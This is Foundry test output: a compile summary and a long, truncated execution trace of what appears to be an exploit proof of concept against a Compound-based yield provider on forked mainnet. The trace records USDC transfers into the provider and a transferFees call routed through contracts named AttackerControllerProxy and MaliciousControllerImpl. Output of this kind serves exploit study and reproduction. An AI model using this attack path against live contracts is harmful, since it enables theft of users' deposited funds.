Compiling 23 files with Solc 0.8.34
Solc 0.8.34 finished in 505.52ms
Compiler run successful with warnings:
  --> basetest.sol:87:5:
87 |     modifier balanceLog() virtual {
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1621809940 [1.621e9]
    │   │   │   │   └─ ← [Return] 1621809940 [1.621e9]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [22519] CompoundProvider_bb_cUSDC::_takeUnderlying(0xa87Fb592b76236760Cd87092261Ab5e0723D189A, 2323868 [2.323e6])
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1621809940 [1.621e9]
    │   │   │   │   └─ ← [Return] 1621809940 [1.621e9]
    │   │   │   ├─ [16149] USDC::transferFrom(0xa87Fb592b76236760Cd87092261Ab5e0723D189A, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 2323868 [2.323e6])
    │   │   │   │   ├─ [15354] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(0xa87Fb592b76236760Cd87092261Ab5e0723D189A, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 2323868 [2.323e6]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: 0xa87Fb592b76236760Cd87092261Ab5e0723D189A, to: CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], value: 2323868 [2.323e6])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1624133808 [1.624e9]
    │   │   │   │   └─ ← [Return] 1624133808 [1.624e9]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [22519] CompoundProvider_bb_cUSDC::_takeUnderlying(0x1A9501F026B8Fb3654Fa995BF9d7Ca738E582295, 2192169 [2.192e6])
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1624133808 [1.624e9]
    │   │   │   │   └─ ← [Return] 1624133808 [1.624e9]
    │   │   │   ├─ [16149] USDC::transferFrom(0x1A9501F026B8Fb3654Fa995BF9d7Ca738E582295, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 2192169 [2.192e6])
    │   │   │   │   ├─ [15354] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(0x1A9501F026B8Fb3654Fa995BF9d7Ca738E582295, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 2192169 [2.192e6]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: 0x1A9501F026B8Fb3654Fa995BF9d7Ca738E582295, to: CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], value: 2192169 [2.192e6])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1626325977 [1.626e9]
    │   │   │   │   └─ ← [Return] 1626325977 [1.626e9]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [22519] CompoundProvider_bb_cUSDC::_takeUnderlying(0xdB5e3FDCF2599bDdA10394d2416B26160BCFf3cB, 1470035 [1.47e6])
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1626325977 [1.626e9]
    │   │   │   │   └─ ← [Return] 1626325977 [1.626e9]
    │   │   │   ├─ [16149] USDC::transferFrom(0xdB5e3FDCF2599bDdA10394d2416B26160BCFf3cB, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 1470035 [1.47e6])
    │   │   │   │   ├─ [15354] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(0xdB5e3FDCF2599bDdA10394d2416B26160BCFf3cB, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 1470035 [1.47e6]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: 0xdB5e3FDCF2599bDdA10394d2416B26160BCFf3cB, to: CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], value: 1470035 [1.47e6])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1627796012 [1.627e9]
    │   │   │   │   └─ ← [Return] 1627796012 [1.627e9]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [22519] CompoundProvider_bb_cUSDC::_takeUnderlying(0x215C9B8A43B81112613b5c686f580E879a7B32cc, 1198656 [1.198e6])
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1627796012 [1.627e9]
    │   │   │   │   └─ ← [Return] 1627796012 [1.627e9]
    │   │   │   ├─ [16149] USDC::transferFrom(0x215C9B8A43B81112613b5c686f580E879a7B32cc, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 1198656 [1.198e6])
    │   │   │   │   ├─ [15354] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(0x215C9B8A43B81112613b5c686f580E879a7B32cc, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 1198656 [1.198e6]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: 0x215C9B8A43B81112613b5c686f580E879a7B32cc, to: CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], value: 1198656 [1.198e6])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1628994668 [1.628e9]
    │   │   │   │   └─ ← [Return] 1628994668 [1.628e9]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [22519] CompoundProvider_bb_cUSDC::_takeUnderlying(0x6AFf321b5b9aD9C5564B54835fb9af27942AAa06, 1161350 [1.161e6])
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1628994668 [1.628e9]
    │   │   │   │   └─ ← [Return] 1628994668 [1.628e9]
    │   │   │   ├─ [16149] USDC::transferFrom(0x6AFf321b5b9aD9C5564B54835fb9af27942AAa06, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 1161350 [1.161e6])
    │   │   │   │   ├─ [15354] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(0x6AFf321b5b9aD9C5564B54835fb9af27942AAa06, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 1161350 [1.161e6]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: 0x6AFf321b5b9aD9C5564B54835fb9af27942AAa06, to: CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], value: 1161350 [1.161e6])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1630156018 [1.63e9]
    │   │   │   │   └─ ← [Return] 1630156018 [1.63e9]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [22519] CompoundProvider_bb_cUSDC::_takeUnderlying(0x19Ac2C2f5C300286a069ED5f1247A9544338a2CD, 1012506 [1.012e6])
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1630156018 [1.63e9]
    │   │   │   │   └─ ← [Return] 1630156018 [1.63e9]
    │   │   │   ├─ [16149] USDC::transferFrom(0x19Ac2C2f5C300286a069ED5f1247A9544338a2CD, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 1012506 [1.012e6])
    │   │   │   │   ├─ [15354] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(0x19Ac2C2f5C300286a069ED5f1247A9544338a2CD, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 1012506 [1.012e6]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: 0x19Ac2C2f5C300286a069ED5f1247A9544338a2CD, to: CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], value: 1012506 [1.012e6])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1631168524 [1.631e9]
    │   │   │   │   └─ ← [Return] 1631168524 [1.631e9]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [22519] CompoundProvider_bb_cUSDC::_takeUnderlying(0x7bA6Da6Da32AC61cC7B602B163F49EE80Fc42767, 1000000 [1e6])
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1631168524 [1.631e9]
    │   │   │   │   └─ ← [Return] 1631168524 [1.631e9]
    │   │   │   ├─ [16149] USDC::transferFrom(0x7bA6Da6Da32AC61cC7B602B163F49EE80Fc42767, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 1000000 [1e6])
    │   │   │   │   ├─ [15354] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(0x7bA6Da6Da32AC61cC7B602B163F49EE80Fc42767, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 1000000 [1e6]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: 0x7bA6Da6Da32AC61cC7B602B163F49EE80Fc42767, to: CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], value: 1000000 [1e6])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1339] USDC::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1632168524 [1.632e9]
    │   │   │   │   └─ ← [Return] 1632168524 [1.632e9]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [76692] CompoundProvider_bb_cUSDC::transferFees()
    │   │   │   ├─ [539] AttackerControllerProxy::_beforeCTokenBalanceChange()
    │   │   │   │   ├─ [143] MaliciousControllerImpl::_beforeCTokenBalanceChange() [delegatecall]
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Return]
    │   │   │   ├─ [59050] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::redeemUnderlying(0)
    │   │   │   │   ├─ [1339] USDC::balanceOf(0x39AA39c021dfbaE8faC545936693aC917d5E7563) [staticcall]
    │   │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0x39AA39c021dfbaE8faC545936693aC917d5E7563) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 2762901122770 [2.762e12]
    │   │   │   │   │   └─ ← [Return] 2762901122770 [2.762e12]
    │   │   │   │   ├─ [1853] 0xD8EC56013EA119E7181d231E5048f90fBbe753c0::getBorrowRate(2762901122770 [2.762e12], 5313371850039 [5.313e12], 129030778389 [1.29e11]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003b3bd0e3b
    │   │   │   │   ├─ emit AccrueInterest(: 0, : 1678993609866502354 [1.678e18], : 5313371850039 [5.313e12])
    │   │   │   │   ├─ [1339] USDC::balanceOf(0x39AA39c021dfbaE8faC545936693aC917d5E7563) [staticcall]
    │   │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0x39AA39c021dfbaE8faC545936693aC917d5E7563) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 2762901122770 [2.762e12]
    │   │   │   │   │   └─ ← [Return] 2762901122770 [2.762e12]
    │   │   │   │   ├─ [26341] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::redeemAllowed(0x39AA39c021dfbaE8faC545936693aC917d5E7563, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 0)
    │   │   │   │   │   ├─ [25651] 0xBafE01ff935C7305907c33BF824352eE5979B526::redeemAllowed(0x39AA39c021dfbaE8faC545936693aC917d5E7563, CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 0) [delegatecall]
    │   │   │   │   │   │   ├─ [4556] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::getAccountSnapshot(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   │   │   │   ├─ [1339] USDC::balanceOf(0x39AA39c021dfbaE8faC545936693aC917d5E7563) [staticcall]
    │   │   │   │   │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0x39AA39c021dfbaE8faC545936693aC917d5E7563) [delegatecall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 2762901122770 [2.762e12]
    │   │   │   │   │   │   │   │   └─ ← [Return] 2762901122770 [2.762e12]
    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002c94203484ba700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000e6506ebd8256
    │   │   │   │   │   │   ├─ [7307] 0x8CF42B08AD13761345531b839487aA4d113955d9::getUnderlyingPrice(0x39AA39c021dfbaE8faC545936693aC917d5E7563) [staticcall]
    │   │   │   │   │   │   │   ├─ [1115] 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6::decimals() [staticcall]
    │   │   │   │   │   │   │   │   ├─ [273] 0xc9E1a09622afdB659913fefE800fEaE5DBbFe9d7::decimals() [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 8
    │   │   │   │   │   │   │   │   └─ ← [Return] 8
    │   │   │   │   │   │   │   ├─ [3142] 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6::latestRoundData() [staticcall]
    │   │   │   │   │   │   │   │   ├─ [1409] 0xc9E1a09622afdB659913fefE800fEaE5DBbFe9d7::latestRoundData() [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000042c0000000000000000000000000000000000000000000000000000000005f576d3000000000000000000000000000000000000000000000000000000006a55ec8f000000000000000000000000000000000000000000000000000000006a55eca3000000000000000000000000000000000000000000000000000000000000042c
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000003000000000000042c0000000000000000000000000000000000000000000000000000000005f576d3000000000000000000000000000000000000000000000000000000006a55ec8f000000000000000000000000000000000000000000000000000000006a55eca3000000000000000000000000000000000000000000000003000000000000042c
    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000c9e4bc6cea66a2a4a6ac00000
    │   │   │   │   │   │   ├─ [553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310]) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 784235313515431 [7.842e14]
    │   │   │   │   │   │   ├─ emit DistributedSupplierComp(param0: 0x39AA39c021dfbaE8faC545936693aC917d5E7563, param1: CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], param2: 0, param3: 77232613081136195923568085522837569385714 [7.723e40])
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ [1339] USDC::balanceOf(0x39AA39c021dfbaE8faC545936693aC917d5E7563) [staticcall]
    │   │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0x39AA39c021dfbaE8faC545936693aC917d5E7563) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 2762901122770 [2.762e12]
    │   │   │   │   │   └─ ← [Return] 2762901122770 [2.762e12]
    │   │   │   │   ├─ [5452] USDC::transfer(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 0)
    │   │   │   │   │   ├─ [4663] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transfer(CompoundProvider_bb_cUSDC: [0xDAA037F99d168b552c0c61B7Fb64cF7819D78310], 0) [delegatecall]
